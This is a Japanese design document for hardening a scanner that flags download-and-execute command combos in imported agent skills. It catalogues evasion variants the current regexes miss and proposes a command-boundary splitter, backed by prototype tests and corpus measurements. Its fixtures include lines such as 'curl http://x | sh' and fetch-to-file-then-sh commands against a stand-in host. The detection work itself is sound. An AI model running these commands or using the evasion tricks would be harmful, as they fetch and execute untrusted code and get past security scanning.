# 設計 rev1: skill_vuln_scan のコマンド境界一本化（issue #566・族A/族B）

対象: `scripts/lib/skill_vuln_shell.py` / `scripts/lib/skill_vuln_scan.py` / `scripts/lib/skill_vuln_flow.py`
rev1: 2026-08-26。別案への2系統×2巡レビュー指摘（A〜F）を1件ずつ判定・反映。**リポジトリのコードは無変更**。
実測はすべて **忠実プロトタイプ**（§2.5）に対して本日実行済み。

**A〜F 判定サマリ**: 該当して直した 14 件 / 該当しない 1 件（C-2。構造理由＋立証実測を §3.7 に記載）。

---

## 1. round 0 の完成条件（review-round-cap.md 定型5項目・C-3 反映で強化）

- ①**守る対象**: 取り込みスキル（`root/skills/` 配下）内の「リモート取得 → shell 実行」combo が、**区切り記号の選び方**（`;` `&` `&&` `||` パイプ多段）や**コマンドの綴られ方**（`exec -a` argv[0] リネーム・PATH 相対多段パス）という表層変形だけで検出を回避できる状態を無くすこと。
- ②**信頼境界**: 静的・字句レベルで綴られた悪意あるスキル作者/事故コマンド。動的展開（`$SHELL`・alias・関数・変数間接）は runtime 知識が要るため境界外（既存 `_COMMAND_PATH` コメントの方針を維持）。
- ③**対象外**: B3 homoglyph（`ѕh` U+0455・別 PR）／`.py` 走査／完全 shell パーサ化／実行時検知／`memory_guard.scan_text` の入力正規化（§3.6・現状維持を明記）／`SHELL_EXEC_SUBJECT` の壊滅的バックトラッキング根治（**別 issue へ切り出し済み・頭が起票**。ただし本変更が新規悪化を作らないことは §7 で blocking）。
- ④**blocking の定義**（C-3 の各抜け道を個別に塞ぐ）:
  - (a) A1〜A4・B1・B2 のいずれかが MISS。**判定は §2 の再現ケースを `scan_skills()` 経由（fenced fixture）で実行**し、A1/A2/A4 は `remote_exec_flow.fetch_file_to_exec`、A3/B1/B2 は `remote_exec.curl_pipe_sh` という**新経路の pattern_id まで assert する**（旧 `_PATTERNS` 直当てだけの確認は不可）
  - (b) 実コーパス突合（§6）で: `findings` を **Finding 全フィールド**（rel_path/line/category/severity/pattern_id/snippet）、`flow_findings` 157 件を **FlowFinding 全フィールド**（var/producer_snippet/consumer_snippet 含む）の tuple **list**（set 化禁止）で比較し、**減少が1件でも**あれば blocking
  - (c) before/after 両方で `scan_errors == []` かつ `evaluated == True` でなければ blocking
  - (d) after の `findings` 内で同一 `(rel_path, line, pattern_id)` が**ちょうど1件**であることを Counter で直接 assert（B-1）。flow も `(rel_path, producer_line, consumer_line, pattern_id, var)` で同様
  - (e) §6 で新規に増えた検出は `true_positive` / `false_positive` / `unresolved` に**全件分類**し、`false_positive` または `unresolved` が1件でも残れば blocking（「提示した」だけでは解除不可）。合成 FP（§5.2 の判別ケース等、実コーパスに現れないもの）は分類対象に**含める**
  - (f) 既存テスト2ファイル全緑・§5.2 陽性対照全緑・§5.1 変異が全て赤
  - (g) 行数: **変更対象3ファイルすべて**が 800 行未満（`skill_vuln_scan.py` は現 721 行。プロト実測 766 行 → 実装がこれを超えて 800 に達する場合は file-size-budget に従い分割計画を先に書くまで着手不可）
  - (h) §7 の性能条件: 実コーパス scan_skills が完走し、walltime 悪化が §7 に記録した実測値から**説明できない追加悪化をしない**こと（数値は §7）
- ⑤**検証方法**: ④の各項目に1対1対応する実行手順を §5・§6・§7 に記載（大半は本日プロトで実行済み・結果 verbatim 貼付）。

---

## 2. 前提の evidence（design-review-gate.md 入口条件）

### 2.1 現状の MISS/HIT（issue の再現コマンド・verbatim）

取得: 2026-08-26T03:40:40Z／再現コマンド＝issue 記載の python3 heredoc（本番 `_PATTERNS` 直当て）:

```
MISS 'curl X -o /tmp/f; sh /tmp/f' []
MISS 'curl X -o /tmp/f & sh /tmp/f' []
MISS 'curl X | tee /tmp/f | sh' []
MISS 'curl X --output /tmp/f && sh /tmp/f' []
MISS 'curl X | exec -a foo sh' []
MISS 'curl X | bin/sh' []
```

### 2.2 scan_skills 経由でも全 MISS＋非対称の実証（本番）

取得: 2026-08-26T03:40:56Z。tmpdir の `skills/x/SKILL.md`（```sh フェンス内1行）で `scan_skills`:

```
two_lines  ([], [('remote_exec_flow.fetch_file_to_exec', 2, 3)])   ← 別物理行なら flow が HIT
semi/amp/tee/long_output/exec_a/rel_path → すべて ([], [])
```

### 2.3 原因の実コード裏取り（file:line）

| # | 裏取り |
|---|---|
| A1/A2 | `skill_vuln_shell.py:94-95` `download_and_run` が `&&` のみ要求 |
| A3 | `skill_vuln_shell.py:86` `[^\n\|]*\|\s*{subject}` — 最初のパイプ直後が subject でないと不一致 |
| A4 | `skill_vuln_shell.py:94` `\s-o(?:\s+\|=)` は `--output`（直前が `-`）に不一致 |
| B1 | `skill_vuln_shell.py:42-44` `_WRAPPER_STEP` が `-a` の operand `foo` で切れる |
| B2 | `skill_vuln_shell.py:16` `_COMMAND_PATH` が PATH 相対多段パス非対応 |
| 非対称の根 | `skill_vuln_flow.py:92-133` の producer/consumer 処理が物理行/論理行粒度 |

### 2.4 B 群の実測再確認（鵜呑みにせず本番コードで再実行。取得: 2026-08-26T03:52:47Z）

再現: `python3` で本番 lib を import し以下を実行（コマンド全文は §2.4 の各行がそのまま再現コード）:

```
B-2 memory_guard.scan_text("echo ok # curl http://x | sh") → [('remote_exec.curl_pipe_sh', 1)]  # HIT（コメント未除去）＝主張どおり
B-3 is_shell_continuation('x=$(printf ")" && curl X -o /tmp/f;') → False                          # quirk 実在＝主張どおり
B-4 _PATTERNS × "CURL http://x | SH" → ['remote_exec.curl_pipe_sh']                               # IGNORECASE＝主張どおり
B-5 'echo "curl http://x | sh"' → [] / 'echo "curl http://x | sh" extra' → HIT                    # guard は quote 完全一致行のみ守る
```

B-1（物理行ループ dedup 不在）はコード構造で確定: `skill_vuln_scan.py:675-681` は無条件 append・`existing_keys` は追加のみ。`continue` による重複排除は joined-line ループ（同 699-708）だけ。

### 2.5 プロトタイプの忠実性（A 対応）

**プロトタイプは本番3ファイルの完全コピーに設計 §3 の変更だけを適用したもの**。場所:
`<scratchpad>/proto566/{skill_vuln_scan,skill_vuln_shell,skill_vuln_flow}.py`（scratchpad = `/private/tmp/claude-501/-Users-matsukaze-takashi-matsukaze-utils-evolve-anything/edc46b5d-a0ae-4e3d-a7bf-414634744787/scratchpad`）。
検証コマンド: `diff <本番ファイル> <proto ファイル>` で差分が §3 の対応表の項目**のみ**であること（レビュアーが実行可能。proto は設計文書と同じ scratchpad に現物あり）。

| 設計 §3 の項目 | プロトの該当箇所（マーカー `PROTO #566`） |
|---|---|
| 新単一ソース `split_shell_command_units` | shell.py: `join_logical_lines` 直前に新設（約90行） |
| B2 `_COMMAND_PATH` 拡張 | shell.py:16 相当を `(?:\.{1,2}/\|/)?(?:[A-Za-z0-9._+-]+/)*` へ |
| B1 `_OPTION_WITH_OPERAND` | shell.py: `_WRAPPER_STEP` 定義に alternation 追加 |
| A3 relax | shell.py: `build_remote_exec_patterns(relax_pipe=False)` 引数化。`mid = [^\n]*`（relax時）/`[^\n\|]*`（既定） |
| unit パターン集合 | scan.py: `_UNIT_PATTERNS`（remote_exec のみ relax 版・他は `_PATTERNS` と同一オブジェクト） |
| 物理行ループの unit 配線＋B-1 dedup | scan.py: 物理行ループに existing_keys 照合を追加し、shell_scope 行を normalize→分割→`_scan_line(patterns=_UNIT_PATTERNS)` |
| 論理行ループの unit 配線 | scan.py: joined_text にも同処理 |
| flow の unit 逐次処理 | flow.py: `detect_flows_in_scope` が shell_scope 行を分割し `_process_flow_unit` を unit 順に呼ぶ（本体は旧ループ本体そのまま） |
| `_scan_line` の patterns 引数 | scan.py: `patterns: Optional[...]=None`（既定 `_PATTERNS`＝**memory_guard など既存呼び出し元の挙動不変**） |

**忠実でない部分（未測定として明示）**: ①プロトの `_process_flow_unit` は機械的切り出しで `if True:` の残骸を含む（実装ではきれいに書く。**ロジックは同一**）②実装時のコメント・命名は変わる。この2点は挙動に影響しない構造差のみ。

### 2.6 実コーパス before 集合

取得: 2026-08-26T03:55:16Z（§6 の突合実行と同一実行内）／再現コマンドは §6 のスクリプト verbatim:
scanned=1351 / scan_errors=[] / evaluated=True / findings=6 / flow_findings=157。
内訳（03:40:56Z 取得）: `prompt_injection.ignore_previous`×3・`remote_exec.curl_pipe_sh`×2・`secret_exfil.source_and_sink`×1・flow は全件 `remote_exec_flow.fetch_file_to_exec`。

### 2.7 行数（file-size-budget・**変更対象3ファイル全部に適用**）

取得: 2026-08-26T04:04Z `wc -l`（プロトは実装の忠実な近似なので「見込み」でなく実測）:

| ファイル | 現在 | プロト実測 | 800 判定 |
|---|---|---|---|
| skill_vuln_shell.py | 340 | **431** | OK（500 未満） |
| skill_vuln_scan.py | 721 | **766** | OK だが**既に 500 超の分割検討域**。実装で 800 に接近したら分割計画を先に書く（④(g)） |
| skill_vuln_flow.py | 141 | **158** | OK |

### 2.8 既存テストの所在

`scripts/lib/tests/test_skill_vuln_scan.py`（2536行）・`test_skill_vuln_shell.py`（345行。#562 の再現・FP 対照テスト含む）。取得: 2026-08-26 `grep -rl skill_vuln scripts/lib/tests`。

空欄の前提: なし。

---

## 3. 設計本体

### 3.1 方針の一文

**4つ目の単一ソース「コマンド境界」`split_shell_command_units` を `skill_vuln_shell.py` に新設し、(a) 物理行/論理行スキャンと (b) flow 解析の両方を unit 単位へ配線する。族Aは「境界分割＋既存 flow 機構への合流」で塞ぎ、族Bは `SHELL_EXEC_SUBJECT` の文法拡張で塞ぐ。**

### 3.2 新設する単一ソース（シグネチャ・プロトで動作実証済み）

```python
def split_shell_command_units(text: str) -> List[str]:
    """コメント除去済み（effective_shell_text 適用後）の1論理行をコマンド単位に分割。
    区切り: `;`（`;;` 含む）・`&&`・`||`・単独 `&`。単独 `|` は分割しない（パイプラインは1実行単位）。
    `>&` `<&` `|&` `&>` の `&` は区切りにしない。quote/escape/$()/backtick/( ) の内側は境界にしない。
    double quote 内の `)` で深度を減らさない（B-3: is_shell_continuation の既知 quirk を継承しない）。
    空 unit は落とす。"""
```

- **「1つの繋がり」の定義（C-1 対応・明文化）**: pipe の consumer は**同一 pipeline（連続する `|` で結ばれた1 unit）内**に限る。`;` `&` `&&` `||` を跨いだ後続 unit は pipe consumer にしない（unit 分割が構造ごと保証する）。ファイル consumer（`sh /tmp/f`）は flow の producer→consumer **順序付き**照合で、**同一行内でも unit の行内順序を保存**する（consumer が producer より前の unit にあれば非検出。実測: `sh /tmp/f; curl -o /tmp/f` → 非検出）。
- **B-3**: 新関数は独自の状態機械で、`is_shell_continuation` の「double quote 内 `)` で depth 減算」quirk を**共有しない**。実測: `x=$(printf ")" && curl X -o /tmp/f); sh /tmp/f` → `['x=$(printf ")" && curl X -o /tmp/f)', 'sh /tmp/f']`（正しく2分割。取得 2026-08-26T03:58:15Z）。`is_shell_continuation` 側の quirk 修正は本 PR 対象外（触らない）。
- 判定不能な構文は「分割しない」側に倒す（unit が大きいままでも従来の行全体照合と同等の検査は残る＝検出を弱めない）。

### 3.3 既存要素の書き換え対応表

| 既存 | 変更 | 理由 |
|---|---|---|
| `_PATTERNS` | 不変（行全体への適用は現状維持＝後方互換） | 境界を regex に足さない |
| `_UNIT_PATTERNS`（新設・scan.py） | remote_exec 5種を `relax_pipe=True` で再構築＋非 remote_exec は `_PATTERNS` と同一オブジェクトを共有。**IGNORECASE は既存と同一**（B-4: `build_remote_exec_patterns` 内の `re.compile(source, re.IGNORECASE)` を共用するためフラグ差は構造上生じない） | unit 内には `;` `&` が無いので relax が安全 |
| `download_and_run` | 保持・regex 不変 | 既存 HIT の後方互換。A1/A2/A4 の新規捕捉は flow が担う。**重複は dedup（下）が吸収**（F-3。実測: `curl http://x \| sh` で findings ちょうど1件） |
| `curl_pipe_sh`/`base64_pipe_sh` | `relax_pipe` 引数化。**relax 版は unit にのみ適用**（行全体には既定の厳格版のまま） | F-1: relax を行全体に当てると `curl X \| jq .; foo \| sh` が FP になる（実測 True）。unit 化で消える（実測 全 False）。実コーパスでは relax-full-line でも新規 0 件だが（03:58Z〜04:03Z 実測）、合成ケースで FP クラスが実在するため unit 限定は維持 |
| `_WRAPPER_STEP` | `_OPTION_WITH_OPERAND = (?:--?[A-Za-z][A-Za-z0-9_-]*\s+[^\s\|;&()<>]+)` を alternation 先頭に追加 | B1。「最終的に `_SHELL_COMMAND` へ到達した場合のみ finding」の既存不変条件（shell.py:47-50 コメント）はそのまま＝非 shell を shell に化けさせない |
| `_COMMAND_PATH` | `(?:\.{1,2}/\|/)?(?:[A-Za-z0-9._+-]+/)*` | B2。FP・性能への影響は §6・§7 で実測済み |
| 物理行ループ（scan.py:675-681） | **① existing_keys 照合を追加（B-1 修正）** ② shell_scope 行は `_normalize_for_matching(effective_line)` を分割し各 unit を `_scan_line(..., in_literal_zone=True, patterns=_UNIT_PATTERNS)` | B-1 は本設計が旧 regex を保持する以上必ず当たる指摘（構造で確認済み）。正規化順序は normalize → split → match（NFKC が全角 `；` を `;` に畳んでから分割） |
| 論理行ループ | joined_text にも同じ unit 処理 | 継続行で組んだ combo も同型で捕捉 |
| `detect_flows_in_scope` | shell_scope 行の norm を unit 分割し**行内順で逐次処理**（consumer 照合 → producer 登録の unit 内順序は現行の行単位処理と同じ） | A1/A2/A4 の本丸。`FLOW_FETCH_TO_FILE` は `-o/-O/--output/>` を既にカバー |
| `_scan_line` | `patterns` 引数を追加（既定 `_PATTERNS`） | **既定値により memory_guard 等の既存呼び出し元は挙動不変**（§3.6） |

### 3.4 各ケースの捕捉点（プロト実測済み・取得 2026-08-26T03:55:01Z・fenced fixture 経由）

| # | 入力 | 実測結果 |
|---|---|---|
| A1 | `curl http://x -o /tmp/f; sh /tmp/f` | `remote_exec_flow.fetch_file_to_exec` (2,2) **HIT** |
| A2 | `… & sh /tmp/f` | 同上 **HIT** |
| A3 | `curl http://x \| tee /tmp/f \| sh` | `remote_exec.curl_pipe_sh` **HIT** |
| A4 | `… --output /tmp/f && sh /tmp/f` | `remote_exec_flow.fetch_file_to_exec` (2,2) **HIT** |
| B1 | `curl http://x \| exec -a foo sh` | `remote_exec.curl_pipe_sh` **HIT** |
| B2 | `curl http://x \| bin/sh`（`usr/bin/sh` も） | `remote_exec.curl_pipe_sh` **HIT** |
| B3 | homoglyph | 対象外（別 PR） |

### 3.5 quote / heredoc / コメント内の区切り誤認防止

- コメント: 分割入力は常に `effective_shell_text` 適用後（3呼び出し点とも）。
- quote/`$()`/backtick/subshell: 分割関数自身が追跡（§3.2）。実測（03:58:15Z）: `grep 'a;b' f`・`echo "x;y"`・`` x=`a; b` ``・`x=$(a; b)`・`( a; b )`・`\;`（escaped）・`2>&1`・`&>`・`|&` すべて誤分割なし。`;;`（case 文）は空 unit として無害（`case x in a) foo;; b) bar` は unit 化されるが subject 不在で FP なし）。
- heredoc: data heredoc 本文は走査前に除外済み。zone 判定（`compute_heredoc_zones`）は物理行ベースのまま不変。
- 冪等性（D）: `effective_shell_text` は実コーパス **860,054 行で f(f(x))==f(x) 違反 0 件**、`split_shell_command_units` も全テストケースで再分割不変（取得 2026-08-26T03:58:15Z・再現 = proto566/mutation_battery.py と同型の走査）。

### 3.6 `memory_guard.scan_text` への影響（B-2 対応）

`memory_guard.py:178` は**生行**を `_scan_line` に渡す（`effective_shell_text` 非適用。実測: `echo ok # curl http://x | sh` が現行 HIT）。本設計は `_scan_line` に**既定値付き引数を足すだけ**なので、memory_guard の挙動は**完全不変**（unit 分割の恩恵も受けない＝A1 型は memory_guard では引き続き MISS）。これは①後方互換（memory_guard は「コメントでも記憶汚染としては危険」という過剰検出側の現状を維持）②スコープ制御（memory_guard の入力正規化は別 concern）による**意図した非適用**であり、③対象外に明記した。

### 3.7 C-2（anchored 回避）が該当しない構造理由と立証実測

本設計の A1/A2/A4 捕捉は flow の `FLOW_FETCH_TO_FILE.search()`（`skill_vuln_flow.py:21-24`・**非 anchored の search**）で行うため、fetch head の行頭固定が存在しない＝wrapper 前置で回避できる構造がそもそも無い。**立証実測**（2026-08-26T03:55:01Z・fenced fixture）: `env `・`sudo `・`time `・`VAR=1 `・`nohup ` の各 prefix を付けた `curl http://x -o /tmp/f; sh /tmp/f` の**5 本すべて** `remote_exec_flow.fetch_file_to_exec` HIT。なお `_FLOW_ASSIGN`（変数 producer）は `^\s*` アンカーだが、unit 分割により各 unit 先頭にアンカーが当たるため `foo; X=$(curl …)` の代入 producer も拾えるようになる（副次改善）。

### 3.8 逸脱の明示

A3 のみ境界関数でなく `curl_pipe_sh` の relax 引数で塞ぐ。理由: パイプは「コマンドの区切り」でなく「1 パイプライン内の段の区切り」で意味論が異なる。relax は unit 限定適用なので、unit 単一ソースとセットで初めて成立する（F-1 実測が根拠）。

---

## 4. #379 新設凍結との整合

新 store / observability section / advisory adapter / weak_signal channel は作らない。追加は純粋関数1つ＋regex 文法拡張＋既存2ループへの dedup/unit 配線のみ。Finding/FlowFinding スキーマ・カテゴリ・severity・pattern_id 集合も不変。

---

## 5. 陰性試験と陽性対照（C-4 反映: **全変異を本日プロトで実行済み**）

### 5.1 陰性試験（各行 = 1変異・実行済み・すべて RED）

再現: `python3 <scratchpad>/proto566/mutation_battery.py`（ソース全文 174 行が scratchpad に現物）。取得: 2026-08-26T04:00:13Z〜04:03:43Z。

| # | 変異（検査側を壊す） | 壊す不変条件 | 赤くなる検査（実測結果） |
|---|---|---|---|
| M1 | `split_shell_command_units` を常に `[text]` に | 「shell scope の照合は unit 単位」 | A1 が `([],[])` に戻る=**RED**。A3 は HIT のまま（経路が違う証明） |
| M2 | flow 側の unit 配線だけ外す（scan 側は残す） | 「3配線点すべてが境界単一ソースを経由」 | A1 のみ `([],[])`=**RED**、A3 は HIT（**経路別に赤が分離**） |
| M3 | `_UNIT_PATTERNS` の curl_pipe_sh↔base64_pipe_sh の pattern_id を swap | 「finding の pattern_id は発火元 regex と一致」 | A3 が `base64_pipe_sh` を返す=**pattern_id assert が RED**（C-4「swap が緑で通る」の再発防止） |
| M4 | 物理行ループの dedup 無効化 | 「同一 (rel_path,line,pattern_id) はちょうど1件」 | `curl http://x \| sh` は旧経路と unit 経路の**両方**が同一 pattern_id で HIT することを直接実測（dedup 無しなら2件）。dedup ありで**ちょうど1件**を assert=無効化で RED |
| M5a〜e | quote 追跡の**個別**変異×5（single quote / double quote / backtick / `$()` / escape を1つずつ無効化。fixture も1変異1個別） | 「quote/escape/展開の内側は境界でない」 | 5件すべて分割結果が変わり **RED**（例: `grep 'a;b' f` → `["grep 'a", "b' f"]`） |
| M6 | `_REMOTE_LINE_GUARD` を常時マッチ化 | 「echo literal 説明文は非検出」 | `echo "curl http://x \| sh"` が guard ON で `[]`・OFF で `curl_pipe_sh` HIT=**guard は load-bearing**（B-5 の疑義に対し、少なくとも quote 完全一致行では効いていることを変異で立証。`… extra` 付きは現行でも HIT する限界も §2.4 に記録） |

各変異は「壊す不変条件」「通したい検査経路」の両方が相異なる（重複計上なし）。①要素を消す=M1/M2 ②意味を壊す=M3 ③分散・入替=M3(swap)/M2(片側配線) ④検査無効化=M4/M5/M6 — 4クラス各1件以上を実行済みで満たす。

### 5.2 陽性対照（すべて実行済み・全て非検出=GREEN。取得 2026-08-26T03:55:01Z ほか）

1. `echo "curl http://x | sh"` → `([],[])`
2. `curl http://x -o out.json; jq . out.json` → `([],[])`（取得後に非 shell 消費）
3. `grep 'a;b' f | sort | uniq` → `([],[])`
4. `gh api repos/x/contents/f -q .content | base64 -d > f.txt` → `([],[])`
5. `curl http://x | jq .; sh deploy.sh` → `([],[])`（**C-1 の別案 FP ケースが本設計では出ない**）
6. `sh /tmp/f; curl http://x -o /tmp/f` → `([],[])`（順序逆転は非検出=順序保存）
7. 既存テスト `test_issue_562_false_positive_controls_remain_clean` 全件（実装時に pytest で確認・④(f)）

### 5.3 探索した入力クラスと変換

区切り（`;` `;;` `&` `&&` `||` `|` `|&` `>&` `<&` `&>`・quote/escape/`$()`/backtick/subshell 内出現）＝**全て実測**／空白（連続空白・先頭末尾 separator・空 unit）＝実測／Unicode（全角 `；` は NFKC が分割前に畳む・Cf/Mn/Me は既存除去の後段に分割を置く）／改行（継続行結合後に分割）＝配線済み／巨大入力=§7／実行文脈（fenced・indented・`.sh`・heredoc・literal zone）＝§3.5。**未探索として残るクラス**: `case` 文の `;;` の意味論的扱い（現状は無害な過分割・実測済み）・zsh 固有区切り・深い入れ子 subshell の網羅。実装 PR のテストに含め、残れば PR に列挙する。

---

## 6. 偽陽性の実測（**本日実行済み**・C-3/F-2/F-3 反映）

実行: 2026-08-26T03:55:16Z／再現スクリプト全文は本文書と同 scratchpad の背景ジョブ出力に保存（骨子: 本番 lib と proto lib で `scan_skills(Path.home()/'.claude')` を同一プロセス内で連続実行し、Finding **全6フィールド**・FlowFinding **全9フィールド** の tuple list を突合）:

```
before: scanned 1351 errors [] evaluated True F 6 W 157
after : scanned 1351 errors [] evaluated True F 6 W 157
findings removed: 0 / added: 0
flow removed: 0 / flow added: 0
dedup violations（(rel,line,pid) の Counter>1）: {} / flow dedup violations: {}
```

- **F-2 確定: flow_findings 157 件は全フィールド不変**。findings 6 件も全フィールド不変。
- **新規増分 0 件** → 分類対象なし（e 条項は空集合で充足）。合成 FP は §5.2-5（unit 化で消えることを実測済み・`unresolved` なし）。
- 実装 PR でも**同じスクリプトを再実行**する（プロトと実装の差分はゼロが期待値だが、コーパスが生きているため同日連続取得・scanned_files 一致確認を必須とする）。増分が出た場合は e 条項の3分類を全件実施。

---

## 7. 性能（E・別 issue 切り出し済み）

- **根治（`_COMMAND_PATH` の `(A+/)*` 型ネスト量指定子の壊滅的バックトラッキング）は別 issue へ切り出し済み**（頭が起票）。
- **本変更の性能実測（同一入力クラスで before/after。取得 2026-08-26T03:57:34Z・再現: SHELL_EXEC_SUBJECT を re.compile し `search` 1回の perf_counter）**:

| 入力クラス（5000字級・2000 segment） | BEFORE | AFTER | 判定 |
|---|---|---|---|
| 絶対パス多段 `/a/a/…`（既存の遅いクラス） | 2.544s | 2.590s | 不変 |
| **相対パス多段 `a/a/…`（B2 拡張が意味を持つ新クラス）** | 1.359s | **3.095s（2.3倍）** | **新規悪化あり・正直に記録** |
| パス無し長文 | 0.005s | 0.012s | 微増 |

- **実コーパス walltime（scan_skills 全 1351 ファイル。取得 04:03:43Z）**: BEFORE **70.2s** → AFTER **135.0s（+92%）**。主因は unit ごとに `_UNIT_PATTERNS`（高コストな subject を含む）を追加適用するため。ハングなし・完走。
- **打ち切り上限の採否: 本 PR では入れない**。理由: ①上限は「黙って skip」か「検査不能 surface」の設計を要し、後者は observability 追加＝#379 凍結の判定が絡む（scan_errors への追記は既存契約の拡張で凍結対象外だが、その設計は性能 issue 側で backtracking 根治と一体で決める方が二度手間にならない）②現状の悪化は完走可能な範囲（135s は audit のバッチ文脈で許容・ユーザー対話をブロックしない）③上限値の較正には性能 issue 側の adversarial ベンチが要る。**代わりに本 PR の blocking（④(h)）**: 実コーパス完走＋walltime を PR に実測記録し、本節の実測値（+92%・rel クラス 2.3x）から説明できない追加悪化が無いこと。実装時に「unit 数 1 かつ relax 版が厳格版と同一マッチになる場合は unit スキャンを省く」等の低リスク最適化を**任意で**入れてよい（入れたら §6 突合で挙動不変を再確認）。

---

## 8. リスクと未実測

- **リスク1（B2 の FP）**: `_COMMAND_PATH` 拡張は全 static command に波及。実コーパス実測では増分 0 件（§6）だが、コーパスは 1351 ファイルの1標本にすぎない。実装 PR で再突合（④(b)(e)）。
- **リスク2**: `exec -a sh realcmd`（argv0 だけ sh）は backtrack 次第で HIT しうる（過剰検出側・combo 必須なので実害小）。実装時に陽性対照へ追加し挙動を固定する。
- **リスク3**: `_REMOTE_LINE_GUARD` の適用単位が unit 化で実質変わる箇所がある（`echo "…"; curl X | sh` の第2 unit は guard 対象外で正しく HIT=改善方向）。既存テストで固定。
- **リスク4**: flow の同一行 pair（producer_line==consumer_line）が新出する。表示層 `audit/sections_skill_vuln.py` が同一行 pair を想定しているかは**未確認**（実装時に Read で確認。表示の並びキーは (rel, producer, consumer, pid) で同値でも安定）。
- **リスク5**: 性能 +92%（§7）。許容判断はレビューに委ねる（低リスク最適化の余地を §7 に記載）。
- **未実測**: ①実装後の最終形とプロトの差分ゼロ検証（§6 再実行で吸収）②表示層の同一行 pair（リスク4）③`case`/zsh 固有構文の網羅（§5.3）。

---

## 確認事項（暫定採用済み・進行に影響なし）

- A3 を境界関数でなく relax 引数で塞ぐ逸脱（§3.8・F-1 実測が根拠）。
- `download_and_run` 保持（後方互換・dedup 実測済み）。
- 性能打ち切り上限は本 PR に入れない（§7・理由3点併記）。
